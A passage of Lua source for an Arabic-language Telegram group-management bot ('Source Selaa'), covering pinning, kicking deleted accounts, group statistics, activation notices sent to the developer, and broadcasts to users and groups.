local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم الغاء تثبيت الكل'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
Selaa:del(Selaa.."Selaa:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"↯☆انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"↯☆ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source Selaa     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if Selaa:sismember(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Selaa(msg.chat_id_,msg.id_, 1, "↯☆التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local pin_id = Selaa:get(Selaa..'Selaa:PinnedMsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم اعادة تثبيت الرساله'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end end
end
--     Source Selaa     --
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم طرد المحذوفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end,nil)
end
--     Source Selaa     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Selaa(msg.chat_id_, msg.id_, 0,'↯☆*لا يوجد محظورين*', 1, 'md')
Selaa:del(Selaa..'Selaa:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
Selaa:del(Selaa..'Selaa:Ban:'..msg.chat_id_)
x = x + 1
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المحظورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
end
--     Source Selaa     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الجروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = Selaa:scard(Selaa.."Selaa:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه ⇇ ❨ '..dp.title_..' ❩\n↯☆الايدي ⇇ ❨ '..msg.chat_id_..' ❩\n↯☆عدد الاعضاء ⇇ ❨ *'..data.member_count_..'* ❩\n↯☆عدد الادمنيه ⇇ ❨ *'..data.administrator_count_..'* ❩\n↯☆عدد المطرودين ⇇ ❨ *'..data.kicked_count_..'* ❩\n↯☆عدد المكتومين ⇇ ❨ *'..Muted..'* ❩\n↯☆عدد رسائل المجموعه ⇇ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source Selaa     --
if text and text:match('^كشف (-%d+)') then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطورين فقط', 1, 'md')
else
local ConstructorList = Selaa:scard(Selaa.."Selaa:Constructor:"..ChatId) or 0
local BanedList = Selaa:scard(Selaa.."Selaa:Ban:"..ChatId) or 0
local ManagerList = Selaa:scard(Selaa.."Selaa:Managers:"..ChatId) or 0
local MutedList = Selaa:scard(Selaa.."Selaa:Muted:"..ChatId) or 0
local TkeedList = Selaa:scard(Selaa.."Selaa:Selaa:Tkeed:"..ChatId) or 0
local AdminsList = Selaa:scard(Selaa.."Selaa:Admins:"..ChatId) or 0
local VipList = Selaa:scard(Selaa.."Selaa:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/sourcesela' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,Selaa) 
if Selaa.first_name_ ~= false then
ConstructorSelaa = "["..Selaa.first_name_.."](T.me/"..(Selaa.username_ or "sourcesela")..")"
else 
ConstructorSelaa = "حساب محذوف"
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆المجموعه ⇇ ["..dp.title_.."]("..LinkGroup..")\n↯☆الايدي ⇇ ( `"..ChatId.."` )\n↯☆المنشئ ⇇ "..ConstructorSelaa.."\n↯☆عدد المدراء ⇇ ( *"..ManagerList.."* )\n↯☆عدد المنشئين ⇇ ( *"..ConstructorList.."* )\n↯☆عدد الادمنيه ⇇ ( *"..AdminsList.."* )\n↯☆عدد المميزين ⇇ ( *"..VipList.."* )\n↯☆عدد المحظورين ⇇ ( *"..BanedList.."* )\n↯☆عدد المقيدين ⇇ ( *"..TkeedList.."* )\n↯☆عدد المكتومين ⇇ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source Selaa     --
if text and text:match("^غادر (-%d+)$")  then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆المجموعه ⇇ ["..dp.title_.."]\n↯☆تمت المغادره منها بنجاح", 1, "md")
Selaa(Text[2], 0, 1, "↯☆بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, Selaa)
Selaa:srem(Selaa.."Selaa:Groups", dp.id_)
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source Selaa     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and Sudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and Sudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
Selaa:set(Selaa..'Selaa:Num:Add:Bot',Num) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم وضع عدد الاعضاء ⇇ *'..Num..'* عضو', 1, 'md')
end
--     Source Selaa     --
if text == 'تفعيل البوت الخدمي' then 
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط', 1, 'md')
else 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:FreeBot'..Selaa) 
end 
end
if text == 'تعطيل البوت الخدمي' then 
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط', 1, 'md')
else 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:FreeBot'..Selaa,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Games'..msg.chat_id_,true)  
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Games'..msg.chat_id_) 
end
if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
if Admin(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل جلب رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
if Admin(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل جلب رابط المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
--     Source Selaa     --
if text and text:match('^تفعيل$') and SudoBot(msg) and SourceCh(msg) then
if ChatType ~= 'sp' then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(Selaa:get(Selaa..'Selaa:Num:Add:Bot') or 0) and not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عدد اعضاء المجموعه اقل من ⇇ *'..(Selaa:get(Selaa..'Selaa:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
Selaa:del(Selaa..'Selaa:SelaaConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
Selaa:sadd(Selaa.."Selaa:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Selaa:sadd(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
Selaa:srem(Selaa.."Selaa:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
Selaa:srem(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if Selaa:sismember(Selaa..'Selaa:Groups',msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyAdd","↯☆تم تفعيل المجموعه "..dp.title_)  
Selaa:sadd(Selaa.."Selaa:Groups",msg.chat_id_)
if not Selaa:get(Selaa..'Selaa:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not Sudo(msg) then 
Selaa:incrby(Selaa..'Selaa:Sudos'..msg.sender_user_id_,1)
Selaa:set(Selaa..'Selaa:SudosGp'..msg.sender_user_id_..msg.chat_id_,"abs")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
Selaa:set(Selaa.."Selaa:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"↯☆تم تفعيل مجموعه جديده ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆بواسطة ⇇ "..Name.."\n↯☆اسم المجموعه ⇇ ["..NameChat.."]\n↯☆عدد اعضاء المجموعه ⇇ ❨ *"..NumMem.."* ❩\n↯☆ايدي المجموعه ⇇ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n↯☆رابط المجموعه ⇇ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الوقت ⇇ "..os.date("%I:%M%p").."\n↯☆التاريخ ⇇ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and SourceCh(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not Selaa:sismember(Selaa..'Selaa:Groups',msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyAdd","↯☆تم تعطيل المجموعه "..dp.title_)  
Selaa:srem(Selaa.."Selaa:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
Selaa:set(Selaa.."Selaa:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"↯☆تم تعطيل مجموعه جديده ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆بواسطة ⇇ "..Name.."\n↯☆اسم المجموعه ⇇ ["..NameChat.."]\n↯☆ايدي المجموعه ⇇ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n↯☆رابط المجموعه ⇇ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الوقت ⇇ "..os.date("%I:%M%p").."\n↯☆التاريخ ⇇ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
end
--     Source Selaa     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
SendText(DevId,"↯☆هناك من بحاجه الى مساعده ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الشخص ⇇ "..Name.."\n↯☆اسم المجموعه ⇇ ["..NameChat.."]\n↯☆ايدي المجموعه ⇇ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n↯☆رابط المجموعه ⇇ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆الوقت ⇇ "..os.date("%I:%M%p").."\n↯☆التاريخ ⇇ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
--     Source Selaa     --
if text == 'جلب نسخه السورس' then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(DevId, 0, 0, 1, nil, './Selaa.lua', dl_cb, nil)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عزيزي المطور تم ارسال نسخة ملف السورس الى الخاص', 1, 'md')
end end
--     Source Selaa     --
if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
local list = Selaa:smembers(Selaa.."Selaa:Groups")
if #list == 0 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لا يوجد مجموعات مفعله', 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆جاري ارسال نسخه تحتوي على '..#list..' مجموعه', 1, 'md')
local text = "↯☆Source Selaa\n↯☆File Bot Groups\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local GroupsManagers = Selaa:scard(Selaa.."Selaa:Managers:"..v) or 0
local GroupsAdmins = Selaa:scard(Selaa.."Selaa:Admins:"..v) or 0
local Groupslink = Selaa:get(Selaa.."Selaa:Groups:Links" ..v)
text = text..k.." ↬ ⤈ \n↯☆Group ID ↬ "..v.."\n↯☆Group Link ↬ "..(Groupslink or "Not Found").."\n↯☆Group Managers ↬ "..GroupsManagers.."\n↯☆Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(text)
File:close()
local abbas = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. abbas .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(curl)
end
end
end
--     Source Selaa     --
if text == "اذاعه بالخاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "⇇ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
Selaa:setex(Selaa.."Selaa:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل لي سواء ⇇ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯☆للخروج ارسل ⇇ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Selaa:get(Selaa.."Selaa:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء امر الاذاعه بنجاح", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = Selaa:smembers(Selaa..'Selaa:Users') 
if msg.content_.text_ then
for k,v in pairs(list) do 
SelaaText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
SelaaText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
SelaaText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
SelaaText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
SelaaText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
SelaaText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
SelaaText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
SelaaText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اذاعة "..SelaaText.." بنجاح \n↯☆‏الى ⇇ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Selaa     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "⇇ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
Selaa:setex(Selaa.."Selaa:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل لي سواء ⇇ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯☆للخروج ارسل ⇇ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Selaa:get(Selaa.."Selaa:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء امر الاذاعه بنجاح", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = Selaa:smembers(Selaa..'Selaa:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
SelaaText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
SelaaText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
SelaaText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
SelaaText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
SelaaText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
SelaaText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
SelaaText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
SelaaText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اذاعة "..SelaaText.." بنجاح \n↯☆‏في ⇇ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Selaa     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "⇇ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
Selaa:setex(Selaa.."Selaa:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
